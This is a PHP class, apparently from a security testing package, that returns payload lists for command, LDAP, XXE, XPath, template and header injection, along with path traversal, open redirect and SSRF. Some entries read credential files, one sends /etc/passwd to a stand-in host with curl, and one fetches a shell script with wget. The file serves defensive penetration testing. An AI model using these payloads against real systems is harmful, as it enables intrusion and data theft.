<?php

declare(strict_types=1);

namespace ArtisanPackUI\Security\Testing\PenetrationTesting\Payloads;

class InjectionPayloads
{
    /**
     * Get command injection payloads.
     *
     * @return array<string>
     */
    public static function getCommandInjection(): array
    {
        return [
            '; id',
            '| id',
            '|| id',
            '& id',
            '&& id',
            '`id`',
            '$(id)',
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '|| cat /etc/passwd',
            '& cat /etc/passwd',
            '&& cat /etc/passwd',
            '`cat /etc/passwd`',
            '$(cat /etc/passwd)',
            '; ls -la',
            '| ls -la',
            '& dir',
            '; whoami',
            '| whoami',
            "'; ping -c 5 127.0.0.1 #",
            '"; ping -c 5 127.0.0.1 #',
            "\n id \n",
            "\r\n id \r\n",
            '| curl http://evil.com/?data=$(cat /etc/passwd)',
            '; wget http://evil.com/shell.sh',
        ];
    }

    /**
     * Get LDAP injection payloads.
     *
     * @return array<string>
     */
    public static function getLdapInjection(): array
    {
        return [
            '*',
            '*)(&',
            '*)(|(&',
            '*)(|(password=*))',
            '*)(objectClass=*',
            '*)((|userPassword=*)',
            '*)(uid=*))%00',
            'admin)(&)',
            'admin)(|(password=*))',
            '*))(|(objectClass=*',
            'x*)(|(cn=*)',
            '*)(cn=*))(|(cn=*',
        ];
    }

    /**
     * Get XML injection payloads.
     *
     * @return array<string>
     */
    public static function getXmlInjection(): array
    {
        return [
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>',
            '<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
        ];
    }

    /**
     * Get XPath injection payloads.
     *
     * @return array<string>
     */
    public static function getXpathInjection(): array
    {
        return [
            "' or '1'='1",
            "' or ''='",
            "' or 1=1 or ''='",
            "1' or '1'='1",
            "admin' or '1'='1",
            "'] | //user/*[contains(*,'",
            "' or name(//users/user[1]/child::node()[1])='username",
            "x]|//user/username[contains(.,'admin')]|//x[x='x",
        ];
    }

    /**
     * Get template injection payloads.
     *
     * @return array<string>
     */
    public static function getTemplateInjection(): array
    {
        return [
            '{{7*7}}',
            '${7*7}',
            '<%= 7*7 %>',
            '#{7*7}',
            '*{7*7}',
            '@{7*7}',
            '{{constructor.constructor("return this")()}}',
            '{{config}}',
            '{{self.__class__.__mro__[2].__subclasses__()}}',
            '${T(java.lang.Runtime).getRuntime().exec("id")}',
            '#{T(java.lang.Runtime).getRuntime().exec("id")}',
        ];
    }

    /**
     * Get header injection payloads.
     *
     * @return array<string>
     */
    public static function getHeaderInjection(): array
    {
        return [
            "test\r\nHeader: Injected",
            "test\nHeader: Injected",
            "test\r\n\r\n<html>Injected</html>",
            '%0d%0aHeader:%20Injected',
            '%0aHeader:%20Injected',
            'test%0d%0aSet-Cookie:%20evil=value',
            "test\r\nSet-Cookie: evil=value",
        ];
    }

    /**
     * Get path traversal payloads.
     *
     * @return array<string>
     */
    public static function getPathTraversal(): array
    {
        return [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '....//....//....//etc/passwd',
            '....\\\\....\\\\....\\\\windows\\system32\\config\\sam',
            '..%2f..%2f..%2fetc/passwd',
            '..%5c..%5c..%5cwindows/system32/config/sam',
            '..%252f..%252f..%252fetc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd',
            '....//....//....//etc/shadow',
            '/etc/passwd%00.jpg',
            '..%c0%af..%c0%af..%c0%afetc/passwd',
            '..%25c0%25af..%25c0%25af..%25c0%25afetc/passwd',
        ];
    }

    /**
     * Get open redirect payloads.
     *
     * @return array<string>
     */
    public static function getOpenRedirect(): array
    {
        return [
            '//evil.com',
            '///evil.com',
            '\\\\evil.com',
            '/\\/evil.com',
            'https://evil.com',
            '//evil.com/%2f..',
            '///evil.com/%2f..',
            '////evil.com/%2f..',
            'https:evil.com',
            '//evil%E3%80%82com',
            '//evil。com',
            '//%0d%0aevil.com',
        ];
    }

    /**
     * Get SSRF payloads.
     *
     * @return array<string>
     */
    public static function getSsrf(): array
    {
        return [
            'http://127.0.0.1',
            'http://localhost',
            'http://[::1]',
            'http://0.0.0.0',
            'http://169.254.169.254/latest/meta-data/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://100.100.100.200/latest/meta-data/',
            'http://192.168.0.1',
            'http://10.0.0.1',
            'http://172.16.0.1',
            'file:///etc/passwd',
            'dict://localhost:11211/stat',
            'gopher://localhost:6379/_PING',
            'http://127.1',
            'http://127.0.1',
            'http://2130706433',
            'http://0x7f000001',
            'http://017700000001',
        ];
    }
}
